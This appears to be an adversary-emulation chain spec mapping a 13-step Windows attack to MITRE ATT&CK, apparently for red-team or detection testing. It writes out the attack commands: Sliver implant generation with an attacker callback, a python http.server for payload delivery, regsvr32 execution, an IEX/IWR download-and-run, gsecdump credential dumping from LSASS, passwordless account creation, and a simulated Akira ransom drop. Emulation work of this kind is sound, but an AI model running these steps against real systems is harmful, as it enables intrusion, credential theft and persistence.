# Chain 098

**Testbed**: `env0` · **Steps**: 13 · **Tactics touched**: Command and Control, Initial Access, Execution, Discovery, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Initial Access | T1566.002 |
| Execution | T1204.002, T1059.001 |
| Discovery | T1057 |
| Credential Access | T1003 |
| Persistence | T1136.001 |
| Impact | T1486 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build DLL Sliver implant | Sliver Console |
| 2 | Initial Access | T1566.002 | Simulate the victim download a file on its machine | Human |
| 3 | Execution | T1204.002 | Simulate the victim execute a DLL file on its machine | Human |
| 4 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 5 | Discovery | T1057 | Remote Processes List | Sliver Executor |
| 6 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 7 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file as Admin (Root) | Human |
| 8 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable | Human |
| 9 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 10 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 11 | Credential Access | T1003 | Gsecdump | Powershell Executor |
| 12 | Persistence | T1136.001 | Create a new user in PowerShell | Powershell Executor |
| 13 | Impact | T1486 | Akira Ransomware drop Files with .akira Extension and Ransomnote | Powershell Executor |

## Attack Steps (Detail)

### Step 1 — Build DLL Sliver implant

- **UUID**: `sliver-payload-windows-dll`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(dll-file ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download a file on its machine

- **UUID**: `simulate-download-file`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Initial Access
- **MITRE ID(s)**: T1566.002
- **Technique(s)**: Phishing: Spearphishing Link

**Description**

This step simulates the victim accidentally downloads a malicious file by clicking a link.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to #{SAVE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`

---

### Step 3 — Simulate the victim execute a DLL file on its machine

- **UUID**: `simulate-execute-dll-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim executes a DLL file on its machine.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, use PowerShell or Command Prompt)
regsvr32 #{DLL_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `DLL_PATH` | Saved path of the DLL file | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(dll-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 4 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 5 — Remote Processes List

- **UUID**: `sliver-ps`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Discovery
- **MITRE ID(s)**: T1057
- **Technique(s)**: Process Discovery

**Description**

The `ps` command lists all running processes on a remote system. It returns a list of processes with details such as the process ID (PID) and executable name. The command includes flags for exe, overflowing terminal width, filtering based on owner/pid, printing command line arguments, skipping the first n page(s), printing process tree and setting outtime.

**Execution** (Sliver Executor)

```
ps(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(process-info-known ?target - host)`

---

### Step 6 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 7 — Simulate the victim download and execute malicious payload file as Admin (Root)

- **UUID**: `simulate-download-execute-file-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 8 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable

- **UUID**: `simulate-execute-lnk-windows`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut file whose target is a pre-staged executable on the victim host. LNKs are a very common phishing vehicle — often delivered inside an archive with a misleading double-extension name (e.g. `invoice.pdf.lnk`). Double-clicking the shortcut runs the pointed-to executable via `explorer.exe`.

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Double-click a shortcut (.lnk) file whose target is:
#{EXE_PATH}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed ?file - file ?target - host)`

---

### Step 9 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 10 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 11 — Gsecdump

- **UUID**: `art-t1003-gsecdump-lsass`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003
- **Technique(s)**: OS Credential Dumping

**Description**

Dumps active-session credentials from LSASS via gsecdump-v2b5 (TrueSec
legacy tool). Uses Method 3 (fold get_prereq_command from ART): the
action itself stages the binary from web.archive.org with SHA256
verification if not already present, then runs `gsecdump -a`. Precondition
is just a powershell session; no marker predicate for the binary. ART
auto_generated_guid 96345bfc-8ae7-4b6a-80b7-223200f24ef9.

**Execution** (Powershell Executor)

```
if (-not (Test-Path "#{gsecdump_exe}")) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  $parentpath = Split-Path "#{gsecdump_exe}"
  $binpath = "$parentpath\gsecdump-v2b5.exe"
  New-Item -ItemType Directory $parentpath -Force | Out-Null
  IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
  if (Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" "#{gsecdump_bin_hash}") {
    Move-Item $binpath "#{gsecdump_exe}"
  }
}
& "#{gsecdump_exe}" -a
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke the prereq + main command. | — | yes |
| `gsecdump_exe` | Local path on target where gsecdump binary should be staged and run. | C:\\Users\\Public\\gsecdump.exe | yes |
| `gsecdump_url` | Download URL for the gsecdump-v2b5 binary (web archive). | https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe | yes |
| `gsecdump_bin_hash` | Expected SHA256 of the gsecdump-v2b5.exe binary. | 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 12 — Create a new user in PowerShell

- **UUID**: `art-t1136_001-new-localuser-ps`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1136.001
- **Technique(s)**: Create Account: Local Account

**Description**

PowerShell variant of local user creation: `New-LocalUser -NoPassword`
creates a passwordless local account. Same persistence outcome as
net user, cleaner cmdlet trail. ART auto_generated_guid
bc8be0ac-475c-4fbf-9b1d-9fffd77afbde.

**Execution** (Powershell Executor)

```
New-LocalUser -Name "#{username}" -NoPassword
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke New-LocalUser. | — | yes |
| `username` | Local account name to create. | BackupSvcPs | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(user-created ?u - user ?target - host)`

---

### Step 13 — Akira Ransomware drop Files with .akira Extension and Ransomnote

- **UUID**: `art-t1486-akira-ransomware-sim`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1486
- **Technique(s)**: Data Encrypted for Impact

**Description**

Simulates Akira ransomware post-encryption artefacts: writes 100
random-byte 1MB files with `.akira` extension to `C:\` and drops a
ransom note on the user's Desktop. Does not actually encrypt user
data — models the observable trail an incident responder would find.
Under aurora's "technique-attempted" positioning we accept this as
`data-encrypted` (the .akira files are the encrypted artefact from
the model's point of view). ART auto_generated_guid
ab3f793f-2dcc-4da5-9c71-34988307263f.

**Execution** (Powershell Executor)

```
1..#{file_count} | ForEach-Object {
  $out = New-Object byte[] 1073741
  (New-Object Random).NextBytes($out)
  [IO.File]::WriteAllBytes("#{output_dir}\test.$_.akira", $out)
}
"Hi friends" | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
"Your files have been encrypted." | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to drop the .akira files and ransom note. | — | yes |
| `file_count` | Number of .akira artefact files to drop. | 100 | yes |
| `output_dir` | Target-side directory where .akira files are written. | C:\\Users\\Public | yes |
| `ransom_note_name` | Ransom-note filename dropped on the user's desktop. | akira_readme.txt | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(data-encrypted ?d - data ?target - host)`

---
